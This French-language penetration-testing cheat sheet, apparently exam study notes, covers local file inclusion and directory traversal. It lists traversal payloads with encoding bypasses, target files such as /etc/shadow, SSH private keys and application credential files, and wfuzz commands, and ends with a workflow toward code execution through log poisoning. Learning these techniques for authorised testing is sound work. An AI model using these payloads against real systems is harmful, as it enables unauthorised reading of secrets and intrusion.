# LFI & Directory Traversal

## 1. Concepts

| Type                    | Description                                              |
|-------------------------|----------------------------------------------------------|
| **Directory Listing**   | Liste les fichiers/dossiers mais ne lit pas leur contenu |
| **Directory Traversal** | Lit le contenu de fichiers hors web root via `../`       |
| **LFI**                 | Inclut et exécute un fichier local (PHP `include`)       |

---

## 2. Paramètres suspects à cibler

```
?file=
?f=
?path=
?location=
?l=
?data=
?download=
?page=
?menu=
?template=
/file/something
/download/something
```

---

## 3. Payloads de base

### 3.1 Chemin absolu (si accepté)

```bash
?path=/etc/passwd
?path=/var/www/html/data.txt
?file=C:\Windows\win.ini          # Windows
```

### 3.2 Chemin relatif (traversal)

```bash
# Linux — empiler les ../ jusqu'à atteindre la racine
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd

# Windows
..\..\..\windows\win.ini
../../../../windows/win.ini
```

!!! tip "Astuce"
    Trop de `../` ne pose pas de problème — arrivé à `/`, rester à `/`.  
    Utiliser **8-10 niveaux** pour être sûr d'atteindre la racine.

### 3.3 Encodages alternatifs

```bash
# URL-encodé
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2F..%2F..%2Fetc%2Fpasswd

# Double URL-encodé
%252e%252e%252f
..%252F..%252F..%252Fetc%252Fpasswd

# Unicode
..%c0%af..%c0%afetc%c0%afpasswd

# Combiné
....//....//....//etc/passwd       # si ../ filtré mais pas ../
..././..././..././etc/passwd
```

---

## 4. Fichiers cibles utiles

### 4.1 Linux

```bash
/etc/passwd                        # users système
/etc/shadow                        # hashes (si root)
/etc/hosts                         # DNS local
/etc/hostname                      # nom machine
/proc/self/environ                 # variables env (peut contenir secrets)
/proc/self/cmdline                 # commande du process courant
/var/log/apache2/access.log        # log Apache (→ log poisoning)
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log                  # SSH attempts
/var/log/pureftpd.log
/home/USER/.ssh/id_rsa             # clé SSH privée
/home/USER/.bash_history
/var/www/html/config.php           # config appli (credentials BDD)
/var/www/html/wp-config.php        # WordPress
```

### 4.2 Windows

```bash
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\access.log
C:\Users\Administrator\Desktop\proof.txt
```

### 4.3 Fichiers config applicatifs (Spring Boot / autres)

```bash
application.properties
application.yml
config/application.properties
config/application.yml
.env
config.php
database.php
```

---

## 5. Fuzzing avec Wfuzz

### 5.1 Fuzzing path traversal standard

```bash
wfuzz -c \
  -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  --hc 404 --hh 0,81 \
  "http://TARGET/page.php?path=../../../../../../../../../../FUZZ"
```

### 5.2 Fuzzing avec deux wordlists (chemins + fichiers)

```bash
# Créer paths.txt
cat > paths.txt << 'EOF'
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
EOF

# Créer files.txt selon le contexte (Spring, WordPress, etc.)
cat > files.txt << 'EOF'
application.properties
application.yml
config/application.properties
config/application.yml
.env
wp-config.php
EOF

# Lancer
wfuzz -w paths.txt -w files.txt --hh 0 \
  "http://TARGET/page?menu=FUZZFUZ2Z"
```

---

## 6. Directory Listing vs Traversal

```bash
# Directory Listing : liste les fichiers d'un dossier
?path=..%2F..%2F..%2F                  # → affiche le contenu du dossier

# Directory Traversal : lit un fichier
?path=../../../etc/passwd              # → affiche le contenu du fichier

# Test : si /etc/passwd retourne "Path is not a directory"
# → c'est du Directory Listing, pas du Traversal
```

**Utilité du Directory Listing :**

- Lister `/home/` → trouver les users
- Lister le web root → trouver config, fichiers sensibles

---

## 7. Cas pratique : trouver un fichier de config

```bash
# 1. Confirmer le traversal
?menu=../../../../windows/win.ini       # Windows
?path=../../../../../../etc/passwd      # Linux

# 2. Fuzzer pour trouver les fichiers de config
wfuzz -w paths.txt -w files.txt --hh 0 "http://TARGET/endpoint?param=FUZZFUZ2Z"

# 3. Lire le fichier trouvé
?menu=../config/application.properties
```

---

## 8. Workflow exam

```
1. Identifier les paramètres suspects (file, path, page, menu...)
2. Tester chemin absolu : ?path=/etc/passwd
3. Tester chemin relatif : ?path=../../../../etc/passwd (escalader les ../)
4. Si filtré → tester les encodages (%2F, %252F, Unicode)
5. Fuzzer avec LFI-Jhaddix.txt pour trouver d'autres fichiers
6. Lire /etc/passwd → identifier les users
7. Chercher fichiers de config (credentials BDD, clés API)
8. Chercher logs si LFI → tiser vers RCE (log poisoning)
```

!!! warning "Directory Listing ≠ Directory Traversal"
    Si l'appli liste les dossiers mais refuse de lire `/etc/passwd` → c'est du listing, pas du traversal.  
    Chercher quand même des fichiers sensibles accessibles dans les dossiers listés.

!!! tip "Windows vs Linux"
    Confirmer l'OS avec nmap avant de choisir les payloads.  
    Windows → `win.ini`, Linux → `etc/passwd`